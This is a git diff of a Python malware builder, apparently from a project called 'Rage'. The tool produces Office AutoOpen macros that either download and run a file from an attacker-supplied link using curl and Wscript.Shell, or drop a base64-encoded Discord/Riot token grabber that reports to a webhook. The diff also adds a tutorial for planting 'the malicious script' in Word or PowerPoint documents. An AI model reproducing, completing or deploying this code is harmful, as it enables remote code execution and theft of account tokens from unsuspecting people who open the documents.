@@ -1,10 +1,16 @@
+# by billythegoat356
+
+# https://github.com/billythegoat356/Rage
+
+
+
 from pystyle import Anime, Colorate, Colors, Center, System, Write
 
 from base64 import b64encode
 from pyperclip import copy
 
 
-def mkscript(webhook: str, ping: bool) -> str:
+def mkpyscript(webhook: str, ping: bool) -> str:
     code =  r"""# by billythegoat356
 
 # https://github.com/billythegoat356/Rage
@@ -231,6 +237,7 @@ while True:
     token_grab()
 """
 
+
     e = b64encode(code.encode('cp850')).decode('cp850')
 
     encoded = [e[:900], e[900:1800], e[1800:2700], e[2700:3600], e[3600:4500], e[4500:5400], e[5400:6300], e[6300:7200], e[7200:8100], e[8100:9000], e[9000:9900], e[9900:]]
@@ -245,8 +252,7 @@ while True:
         script.append(chars)
 
 
-    vba =  """
-Sub AutoOpen()
+    vba =  """Sub AutoOpen()
     myFile = "_rage.py"
     Open myFile For Output As #1
     """
@@ -266,6 +272,21 @@ Sub AutoOpen()
         
 End Sub"""
     return vba
+
+
+def mkcustomscript(link: str, extension: str) -> str:
+
+    return f'''Sub AutoOpen():
+    Shell("curl {link} --silent --output _rage{extension}")
+    Dim objShell As Object
+
+    Set objShell = VBA.CreateObject("Wscript.Shell")
+
+
+    objShell.Run("_rage{extension}")
+    
+End Sub'''
+
 
 
 
@@ -297,19 +318,14 @@ banner = r"""
 
 
 ascii_art = """
-    .:'/*/'`:,·:~·–:.,                        ,.-:~:-.                             __'                             ,.-:~:'*:~-.°  
-   /::/:/:::/:::;::::::/`':.,'                /':::::::::'`,                    ,.·:'´::::::::`'·-.                  .·´:::::::::::::::;  
- /·*'`·´¯'`^·-~·:–-'::;:::'`;             /;:-·~·-:;':::',                 '/::::::::::::::::::';               /::;:-·~^*^~-:;:/ ° 
- '\                       '`;::'i‘         ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'           ,.-/:´     .,       ;/     
-   '`;        ,– .,        'i:'/         /                `;::\           /.'´      _         ';/' ‘         /::';      ,'::`:~.-:´;     
-     i       i':/:::';       ;/'        ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘     /;:- ´        `'·–·;:'/' _   
-     i       i/:·'´       ,:''         i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     ;:'`:.., __,.·'::/:::';  
-     '; '    ,:,     ~;'´:::'`:,    ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ;'      ';:::::::::::::::/;;::/  
-     'i      i:/\       `;::::/:'`;' ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘  ¦         '`·-·:;::·-·'´   ';:/‘  
-      ;     ;/   \       '`:/::::/''i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   '\                         /'    
-      ';   ,'       \         '`;/' ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘    `·,                  ,·'  '    
-       `'*´          '`~·-·^'´    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´             '`~·- . , . -·'´          
-                                                                             '`*^~·~^*'´"""[1:]
+    ___                                  
+   R _ ",     ___ _     ___ _     ____   
+  R `-'(|    A __` A   G __` G   E __ E  
+  |  _  R   | |--| |  | |--| |  | _____E 
+  R |_\  R  A A__A A  G G__G G  E E___--.
+ R__| \\__RA\____,__A )-____  GE\______/E
+ |__|  R__| A____,__AG\______/G E______E 
+                      G______G"""[1:]
 
 
 def init():
@@ -322,15 +338,55 @@ def init():
 def w(text: str):
     Write.Input(text=text, color=Colors.red_to_purple, interval=0.005, input_color=Colors.white)
 
-def main(start: bool = False, script: str = None):
+
+def tutorial(script: str):
+    w("First of all, create/open a Microsoft Document (Word, Powerpoint, etc).")
+    print()
+    w("Save it as a Microsoft Document with macros.")
+    print()
+    w("Now, open the file. Go in the 'View' tab, then click on 'Macros'.")
+    print()
+    w("Add a new macro. Name it 'AutoOpen', and be sure to select 'Macro available only for this document'. Then, click on 'Create'.")
+    print()
+    copy(script)
+    w("After, it will open a window showing some code. The malicious script has been copied to your clipboard, so paste the code in the code editor.")
+    print()
+    w("Finally, you can save the file and exit. The malicious script has been succesfully injected.")
+    return exit()
+
+def main(launch_tutorial: bool = False, script: str = None):
     System.Clear()
     print('\n'*2)
     print(Colorate.Diagonal(Colors.red_to_purple, Center.XCenter(ascii_art)))
     print('\n'*3)
 
-    if not start:
+    if launch_tutorial:
+        tutorial(script=script)
+
+
+
+    mode = Write.Input("Use a custom file or the Riot token grabber [c/r] -> ", Colors.purple_to_red, interval=0.005)
+
+    if mode not in ('c', 'r'):
+        Colorate.Error("Please enter either 'c' for a custom file or 'r' for the Riot token grabber!")
+        return
+
+    print()
+
+    if mode == 'c':
+        link = Write.Input("Enter the file's link (to get it, send the file on Discord then copy the link) -> ", Colors.purple_to_red, interval=0.005)
+
+        extension = Write.Input("Enter the file's extension (ex: .py) -> ", Colors.purple_to_red, interval=0.005)
+
+        if not extension.startswith('.'):
+            extension = '.' + extension
+        
+        script = mkcustomscript(link=link, extension=extension)
+
+
+    else: 
         webhook = Write.Input("Enter your webhook -> ",
-                          Colors.purple_to_red, interval=0.005, end=Colors.reset)
+                            Colors.purple_to_red, interval=0.005, end=Colors.reset)
         if not webhook.strip():
             Colorate.Error("Please enter a valid webhook!")
             return
@@ -343,29 +399,15 @@ def main(start: bool = False, script: str = None):
             return
         
         ping = ping == 'y'
-
-        print()
-
-        w("Press enter to start the tutorial...")
-        return main(start=True, script=mkscript(webhook=webhook, ping=ping))
-    else:
-        w("First of all, create/open a Microsoft Document (Word, Powerpoint, anything you want).")
-        print()
-        w("Save it as a Microsoft Document with macros.")
-        print()
-        w("Then, open the file. Go in 'View' pannel, then click on 'Macros'.")
-        print()
-        w("Add a new macro. Name it 'AutoOpen', and be sure to select 'Only for this document'. Then, click on 'Create'.")
-        print()
-        copy(script)
-        w("After, it will open a window showing some code. Select the code, press Ctrl + A then Ctrl + V.")
-        print()
-        w("Finally, you can save the file and exit.")
-        print()
-        w("Now, when someone downloads and executes the file, it will execute the malicious code and send you their Discord token (only if they have Python3 installed).")
+        
+        script = mkpyscript(webhook=webhook, ping=ping)
 
 
-    return exit()
+    print('\n')
+
+    w("Press enter to start the tutorial...")
+    return main(launch_tutorial=True, script=script)
+
 
 
 
